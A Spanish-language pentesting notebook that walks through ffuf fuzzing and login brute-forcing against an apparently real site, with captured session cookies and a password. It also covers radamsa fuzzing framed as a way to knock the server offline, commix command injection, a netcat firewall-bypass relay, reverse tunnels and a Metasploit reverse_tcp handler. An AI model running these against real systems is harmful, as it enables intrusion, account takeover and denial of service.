                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : GET
                 :: URL              : https://www.cncintel.com/FUZZING
                 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Timeout          : 10

                Qué hace esto? va a coger cada una de las entradas de ese diccionario y las va a intercambiar por FUZZ,
                de manera que va a tratar de averiguar si alguna de estas está presente en el servidor victima.
                Ojito que hay que poner siempre FUZZ. No vale poner algo distinto como FUZZING, FAFFING o lo que se te ocurra.
                Muy importante, para que la salida sea lo más limpia posible, recomiendo limpiar los diccionarios con los comentarios.
                He encontrado al lanzar esto por primera que la salida está sucia, pero Santiago muestra en su salida como aparece
                el INFO con la información adecuada.

                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444

                También puedo usar ffuf con un proxy de interceptación como Burp Suite. El del ejemplo usa uno creado escuchando en el puerto 4444.

                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : GET
                 :: URL              : https://www.cncintel.com/FUZZ
                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Proxy            : http://127.0.0.1:4444
                 :: Timeout          : 10
                 :: Threads          : 40
                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500

                 > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444 -recursion

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : GET
                 :: URL              : https://www.cncintel.com/FUZZ
                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Proxy            : http://127.0.0.1:4444
                 :: Timeout          : 10
                 :: Threads          : 40
                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
                ________________________________________________

                Con -recursion va a hacer una busqueda recursiva con los elementos encontrados, es decir, si al encontrar en el servidor el recurso
                admin, luego va a hacer busquedas recursivas añadiendo palabras a /admin, como por ejemplo, /admin/user, /admin/root, etc...

                Tambien puedo hacer busquedas recursivas por el servidor, en este caso estoy buscando ficheros con extension png.

                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -recursion -e .png

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : GET
                 :: URL              : https://www.cncintel.com/FUZZ
                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
                 :: Extensions       : .png
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Timeout          : 10
                 :: Threads          : 40
                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
                ________________________________________________

                .png                    [Status: 403, Size: 139, Words: 3, Lines: 8, Duration: 242ms]
                # Copyright 2007 James Fisher.png [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 421ms]
                2006.png                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 641ms]
                index.png               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 908ms]
                news.png                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1091ms]
                images.png              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1236ms]
                crack.png               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1404ms]
                download.png            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1551ms]

                También puedo usar dos diccionarios a la vez.

                > ffuf -u https://www.cncintel.com/W1/W2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:W1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt:W2

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : GET
                 :: URL              : https://www.cncintel.com/W1/W2
                 :: Wordlist         : W1: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
                 :: Wordlist         : W2: /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Timeout          : 10
                 :: Threads          : 40
                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
                ________________________________________________

                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
                    * W2: # directory-list-1.0.txt
                    * W1: 11

                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 585ms]
                    * W1: # on at least 3 different hosts
                    * W2: # directory-list-1.0.txt


                Basicamente, ffuf nos permite cambiar palabras de diccionario e inyectarlas en el payload de una peticion rest.
                Obviamente, para que esto tenga utilidad, la eleccion de los diccionarios es crucial.

                Podriamos usarlo junto con burp suite para hacer ataques de fuerza bruta contra el usuario y contraseña de una página web, por ejemplo,
                capturas con burp suite la peticion post a un servidor web, guardas esa peticion POST y luego usas ffuf tal que asi:

                    ffuf -request request_post -u https://www.cncintel.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:User -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt:pass -x http://127.0.0.1:4444

                Donde request_post tiene un contenido tal que asi:

                    POST /client-portal/?ppage=login HTTP/2
                    Host: cncintel.com
                    Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
                    Content-Length: 76
                    Cache-Control: max-age=0
                    Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
                    Sec-Ch-Ua-Mobile: ?0
                    Sec-Ch-Ua-Platform: "Linux"
                    Upgrade-Insecure-Requests: 1
                    Origin: https://cncintel.com
                    Content-Type: application/x-www-form-urlencoded
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                    Sec-Fetch-Site: same-origin
                    Sec-Fetch-Mode: navigate
                    Sec-Fetch-User: ?1
                    Sec-Fetch-Dest: document
                    Referer: https://cncintel.com/client-portal/?ppage=login
                    Accept-Encoding: gzip, deflate
                    Accept-Language: en-US,en;q=0.9

                    username=User%40yahoo.com&password=atitelavoyadecir897&atmpt-login=

                Cuando lanzas el comando, puedes ver las peticiones post que estás haciendo contra el servidor, por ejemplo:

                    POST /client-portal/?ppage=login HTTP/2
                    Host: cncintel.com
                    User-Agent: Fuzz Faster U Fool v1.4.0-dev
                    Content-Length: 74
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                    Accept-Encoding: gzip, deflate
                    Accept-Language: en-US,en;q=0.9
                    Cache-Control: max-age=0
                    Content-Type: application/x-www-form-urlencoded
                    Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
                    Origin: https://cncintel.com
                    Referer: https://cncintel.com/client-portal/?ppage=login
                    Scotland_99-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
                    Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
                    Sec-Ch-Ua-Mobile: ?0
                    Sec-Ch-Ua-Platform: "Linux"
                    Sec-Fetch-Dest: document
                    Sec-Fetch-Mode: navigate
                    Sec-Fetch-Scotland_99: ?1
                    Sec-Fetch-Site: same-origin
                    Upgrade-Insecure-Requests: 1

                    username=scotland_99%40yahoo.com&password=atitelavoyadecir897&atmpt-login=

                Es decir, está cambiando la palabra User que he indicado a ffuf para que la cambie por una palabra que aparece en dicho diccionario.
                Ni que decir tiene que esta técnica la puedes usar con más palabras.

                # ffuf and radamsa

                    https://gitlab.com/akihe/radamsa

                Se usan juntos para crear cadenas aleatorias partiendo de palabras de un diccionario, con radamsa, para así tratar de romper, estresar una aplicacion web.

                Literalmente radamsa es capaz de generar cambios aleatorios a palabras que describes en un diccionario. Por ejemplo:

                    > echo "Alonso is aironman and marcos is his nephew" | radamsa
                    Alonso is airon m%s"xcalc$(xcalc)!!\x00%s&#000;%s%n\n!xcalc%#x$`\n%n$+&#000;\r$&%narcoʴs is��� his nephew

                Ves el cambio que ha hecho radamsa? :)

                Ejemplo completo, muestro el fichero request_post, fíjate en la parte donde pongo FUZZ, radamsa va a coger el contenido del fichero texto.txt
                y ffuf va a generar 1000 peticiones con cada permutacion que radamsa genera. Ataque por fuerza bruta. Fíjate que el servidor responde con un
                200, en cuanto empiece a responder con un 404, el servidor está KO. Ahora imagina si es un ataque distribuido con una cadena de bots.

                > cat request_post
                POST /client-portal/?ppage=login HTTP/2
                Host: cncintel.com
                Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
                Content-Length: 76
                Cache-Control: max-age=0
                Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
                Sec-Ch-Ua-Mobile: ?0
                Sec-Ch-Ua-Platform: "Linux"
                Upgrade-Insecure-Requests: 1
                Origin: https://cncintel.com
                Content-Type: application/x-www-form-urlencoded
                User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                Sec-Fetch-Site: same-origin
                Sec-Fetch-Mode: navigate
                Sec-Fetch-User: ?1
                Sec-Fetch-Dest: document
                Referer: https://cncintel.com/client-portal/?ppage=login
                Accept-Encoding: gzip, deflate
                Accept-Language: en-US,en;q=0.9

                username=FUZZ&password=atitelavoyadecir897&atmpt-login=
                > cat texto.txt | radamsa
                texto aleatorio que pondrías como contenido del fichero de texto.
                > ffuf -request request_post  --input-cmd "cat texto.txt | radamsa"  -x http://127.0.0.1:4444 --input-num 1000

                        /'___\  /'___\           /'___\       
                       /\ \__/ /\ \__/  __  __  /\ \__/       
                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                         \ \_\   \ \_\  \ \____/  \ \_\       
                          \/_/    \/_/   \/___/    \/_/       

                       v1.4.0-dev
                ________________________________________________

                 :: Method           : POST
                 :: URL              : https://cncintel.com/client-portal/?ppage=login
                 :: Header           : Accept-Encoding: gzip, deflate
                 :: Header           : Accept-Language: en-US,en;q=0.9
                 :: Header           : Host: cncintel.com
                 :: Header           : Origin: https://cncintel.com
                 :: Header           : Content-Type: application/x-www-form-urlencoded
                 :: Header           : Sec-Fetch-Site: same-origin
                 :: Header           : Sec-Ch-Ua-Mobile: ?0
                 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                 :: Header           : Referer: https://cncintel.com/client-portal/?ppage=login
                 :: Header           : Sec-Ch-Ua-Platform: "Linux"
                 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
                 :: Header           : Sec-Fetch-Mode: navigate
                 :: Header           : Sec-Fetch-User: ?1
                 :: Header           : Sec-Fetch-Dest: document
                 :: Header           : Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
                 :: Header           : Cache-Control: max-age=0
                 :: Header           : Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
                 :: Header           : Upgrade-Insecure-Requests: 1
                 :: Data             : username=FUZZ&password=atitelavoyadecir897&atmpt-login=
                 :: Follow redirects : false
                 :: Calibration      : false
                 :: Proxy            : http://127.0.0.1:4444
                 :: Timeout          : 10
                 :: Threads          : 40
                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
                ________________________________________________

                2                       [Status: 200, Size: 62346, Words: 4444, Lines: 930, Duration: 520ms]
                4                       [Status: 200, Size: 62384, Words: 4452, Lines: 930, Duration: 780ms]
                1                       [Status: 200, Size: 62356, Words: 4446, Lines: 930, Duration: 1003ms]
                6                       [Status: 200, Size: 62320, Words: 4439, Lines: 929, Duration: 1127ms]
                3                       [Status: 200, Size: 62320, Words: 4440, Lines: 930, Duration: 1362ms]
                12                      [Status: 200, Size: 62946, Words: 4578, Lines: 930, Duration: 1570ms]
                14                      [Status: 200, Size: 62375, Words: 4450, Lines: 930, Duration: 1804ms]
                16                      [Status: 200, Size: 62308, Words: 4439, Lines: 929, Duration: 2032ms]
                7                       [Status: 200, Size: 62394, Words: 4453, Lines: 930, Duration: 2499ms]
                25                      [Status: 200, Size: 62352, Words: 4446, Lines: 929, Duration: 2442ms]
                29                      [Status: 200, Size: 62440, Words: 4460, Lines: 932, Duration: 2726ms]
                5                       [Status: 200, Size: 78941, Words: 7085, Lines: 1308, Duration: 3159ms]
                37                      [Status: 200, Size: 62354, Words: 4445, Lines: 931, Duration: 3182ms]
                40                      [Status: 200, Size: 63762, Words: 4672, Lines: 962, Duration: 3438ms]
                8                       [Status: 200, Size: 62338, Words: 4445, Lines: 930, Duration: 3913ms]
                11                      [Status: 200, Size: 62422, Words: 4458, Lines: 931, Duration: 4142ms]
                9                       [Status: 200, Size: 62408, Words: 4446, Lines: 930, Duration: 4483ms]
                15                      [Status: 200, Size: 62353, Words: 4447, Lines: 930, Duration: 4704ms]
                32                      [Status: 200, Size: 62353, Words: 4447, Lines: 930, Duration: 4742ms]
                55                      [Status: 200, Size: 62357, Words: 4447, Lines: 930, Duration: 4385ms]
                51                      [Status: 200, Size: 62351, Words: 4446, Lines: 930, Duration: 4731ms]
                [WARN] Caught keyboard interrupt (Ctrl-C)



                ⭐  ~  ok  took 6s  at 15:58:11 >      

    # Explotacion

    Una vez que has comprometido un sistema, quieres poder explotarlo, encontrar ficheros, contraseñas, cosas así.

        # Commix

        https://github.com/commixproject/commix

        Command injection tool. Using burp suite proxy listening in 4444 port.

        > commix -u http://www.cncintel.com --proxy http://127.0.0.1:4444 --level 3
                                      __           
           ___   ___     ___ ___     ___ ___ /\_\   __  _   
         /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v3.5-dev#60
        /\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
        \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
         \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

        +--
        Automated All-in-One OS Command Injection Exploitation Tool
        Copyright © 2014-2022 Anastasios Stasinopoulos (@ancst)
        +--

        (!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

        [info] Testing connection to the target URL.  
        Got a 301 redirect to https://cncintel.com/
        Do you want to follow the identified redirection? [Y/n] > n
        [info] Performing identification checks to the target URL.
        Do you recognise the server's operating system? [(W)indows/(U)nix-like/(q)uit] > U
        [warning] The HTTP Cookie header is not provided, so this test is going to be skipped.
        [critical] Unable to connect to the target URL (HTTP Error 403: Forbidden).
        [info] Setting the HTTP header 'User-Agent' for tests.
        ^C
        [error] User aborted procedure during the detection phase (Ctrl-C was pressed).


        ⭐  ~  INT  took 2m 17s  at 16:35:27 >

        La forma de saltarse la autentificacion y tratar de capturar algún campo en el que podamos inyectar comandos, es usar el parametro --cookie para pasar un usuario que se pueda autentificar y luego usar el parametro --data con el parámetro que hayamos detectado con burp proxy para ver si se puede inyectar.

        commix -u http://www.cncintel.com --proxy http://127.0.0.1:4444 --cookie="LA COOKIE QUE TE PERMITA ENTRAR EN EL SISTEMA AUTENTIFICADO" --data="EL PARAMETRO AL QUE QUIERES inyectar comandos"

        commix tratará de inyectar payloads, como por ejemplo concatenando comandos como eval(phpinfo();)...
        Si la respuesta es correcta, commix te proporcionará una shell contra el servidor vulnerable donde podrás lanzar comandos.

        # Changeme

            Sirve para encontrar credenciales por defecto en hosts.
            Aquí la he usado para encontrar alguna que se me hubiera olvidado.
            Muestro la segunda ejecución porque la primera mostraba que una instancia de Redis
            estaba con el password por defecto y aunque el puerto está cerrado al exterior, nunca está de más poner una contraseña fuerte.

            https://github.com/ztgrace/changeme

            > sudo python3 changeme.py localhost

             #####################################################
            #       _                                             #
            #   ___| |__   __ _ _ __   __ _  ___ _ __ ___   ___   #
            #  / __| '_ \ / _` | '_ \ / _` |/ _ \ '_ ` _ \ / _ \  #
            # | (__| | | | (_| | | | | (_| |  __/ | | | | |  __/  #
            #  \___|_| |_|\__,_|_| |_|\__, |\___|_| |_| |_|\___|  #
            #                         |___/                       #
            #  v1.2.3                                             #
            #  Default Credential Scanner by @ztgrace             #
             #####################################################

            Loaded 123 default credential profiles
            Loaded 397 default credentials

            No default credentials found

        # Gitleaks

            > sudo apt install gitleaks

            También se puede instalar en osx:
            > brew install gitleaks

            Lo más interesante aparte de escanear por contraseñas y demás credenciales, es que mira también los commits antiguos.

            % gitleaks detect -v .

        # Cyberchef

            Para hacer transformaciones a los datos que introduzcas, es una pasada. Creado por los servicios de inteligencia Occidentales.
            Muy poderoso.
            Tienes una instancia funcionando en

                https://gchq.github.io/CyberChef/

            Es posible que algún día la quiten, por lo que tienes una copia en

                https://github.com/alonsoir/CyberChef

    # Post explotacion avanzada

        # netcat port pivot relay.

        Imagina que una vez que estás en la víctima sabes que hay puertos que están cerrados y otros permitidos por el fw, y quieres
        comprometer la máquina a traves del puerto cerrado por el fw.
        Bueno, imagina que el puerto vulnerable cerrado por el fw es el 23, y el que no lo está es el 40.
        Abres una sesión netcat en la máquina víctima al puerto 23, abres otra sesion netcat contra el puerto 40 y haces un pipeline contra el puerto 23...


        En una terminal de la máquina víctima:

            > nc -lvp 23
            listening on [any] 23 ...
            connect to [127.0.0.1] from localhost [127.0.0.1] 46366
            hola
            aqui estoy
            aqui enviaría el exploit
            enviando el payload al puerto 40, que hará de repetidor guardando el exploit al fichero pivot creado mediante mknod
            que finalmente se redirige al puerto 23 de la máquina victima
            la idea es enviar el exploit a un puerto, en este caso el 40, que no está cerrado por el firewall, y que llegue al puerto 23 que si está cerrado al exterior por el firewall
            moraleja, hay que procurar cerrar todos los puertos innecesarios, pues si el 40 realmente estuviese ocupado por un servicio, yo no podría ocupar el puerto 40 a través de netcat

        En otra máquina que tenga conectividad con la máquina victima, creo el relay. Asumiendo que 127.0.0.1 es la ip de la victima:

            > mknod pivot  p
            > ls pivot
            pivot
            > nc -lvp 40  0<pivot | nc 127.0.0.1 23 1>pivot
            listening on [any] 40 ...
            connect to [127.0.0.1] from localhost [127.0.0.1] 32920

        En otra terminal, desde la maquina que ataca, trato de conectarme al puerto 40 de la maquina que hace de relay y
        enviar el payload malicioso, solo que aquí voy a enviar simple texto explicando lo ocurrido:

            > nc localhost 40
            hola
            aqui estoy
            aqui enviaría el exploit
            enviando el payload al puerto 40, que hará de repetidor guardando el exploit al fichero pivot creado mediante mknod
            que finalmente se redirige al puerto 23 de la máquina victima
            la idea es enviar el exploit a un puerto, en este caso el 40, que no está cerrado por el firewall, y que llegue al puerto 23 que si está cerrado al exterior por el firewall
            moraleja, hay que procurar cerrar todos los puertos innecesarios, pues si el 40 realmente estuviese ocupado por un servicio, yo no podría ocupar el puerto 40 a través de netcat


        Como puedes apreciar, he creado una conexion a traves de un puerto no controlado, he hecho port relay al puerto cerrado y la información llega al puerto 23...

        Travesura realizada. Digamos que esto sirve para enviar ficheros, exploits a la máquina victima usando recursos nativos de la víctima.


        # Localtunnel y ngrok.

            Imagina que quieres exponer un servicio web corriendo en tu servidor de aplicaciones local, que está funcionando a través del puerto 80, o el 8080.
            Desde tu máquina local o máquinas que esten en tu red local, no vas a tener problemas para que puedan acceder a tu servidor de aplicaciones, pero
            si quieres que sea visible desde internet, como la ip que se conoce en internet es la de tu router, no la de tu maquina que gestiona tu página web,
            tendrías que hablar con el administrador de la red de tu empresa para que haga un port forward al ip/puerto correcto o un nat gateway o la técnica que usen para permitir acceder a la ip y el puerto del servidor que quieres acceder dentro de tu red.

            La solución es crear un tunel cifrado reverso, y para ello podemos usar dos opciones, probablemente haya más:

                # Localtunnel

                 https://github.com/localtunnel/localtunnel

                 Imagina que quieres exponer tu servidor local hacia fuera, pues lo levanto o compruebo si está arriba...

                    > sudo service apache2 status
                    ○ apache2.service - The Apache HTTP Server
                         Loaded: loaded (/lib/systemd/system/apache2.service; disabled; preset: disabled)
                         Active: inactive (dead)
                           Docs: https://httpd.apache.org/docs/2.4/

                No lo está, lo levanto:

                    > sudo service apache2 start

                Expongo el puerto 80:

                    > lt --port 80
                    your url is: https://small-words-know-81-41-155-68.loca.lt
                    ^C

                Compruebo que puedo acceder:

                    > curl https://small-words-know-81-41-155-68.loca.lt

                    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                      <head>

                Lo paro una vez termino:

                    > sudo service apache2 stop

                # ngrok

                    https://ngrok.com/

                    Es igual que lo anterior, pero tiene más posibilidades, como crear puentes https, conexiones udp, tcp,...
                    pero las cosas interesantes como crear un puente tls cifrado es de pago.

                    > ngrok http 80   
                    > curl http://ac3d-81-41-155-68.ngrok.io

                    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                      <head>
                        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />


        # transferencia de ficheros.

            # Powershell / Wget

            Lo primero siempre para transferir ficheros entre víctima y atacante es pasar algo a la victima para que trate de crear una conexion con el atacante, luego hay que crear una conexion reversa con msfconsole en el atacante, por ejemplo,

            Dicha conexión entre victima y atacante se puede hacer con powershell-fud, le pasarías para que la victima ejecute algo como ésto:

            https://github.com/BlackShell256/ShellPwnsh?ref=golangexample.com

            Luego, en el atacante, ejecutamos msfconsole para crear la conexion reversa:

                msfconsole

                use exploit/multi/handler

                set payload windows/meterpreter/reverse_tcp

                set lhost 192.168.85.139

                set lport 4321

                exploit

            Ahora, lo que queremos es que el atacante pueda enviar un fichero, algo que sirva para la postexplotacion, para poder mantener la conexion con la víctima en caso de que apague el ordenador, etc...
            En este caso, yo voy a exponer este mismo fichero en vez del exploit para hacer la conexion permanente.
            Comando para servir el fichero en Linux con python2 y Windows, opcionalmente luego puedes exponer el puerto 8080 con LocalTunnel o ngrok:

                python -m SimpleHTTPServer 8080
                /home/kali/anaconda3/bin/python3: No module named SimpleHTTPServer

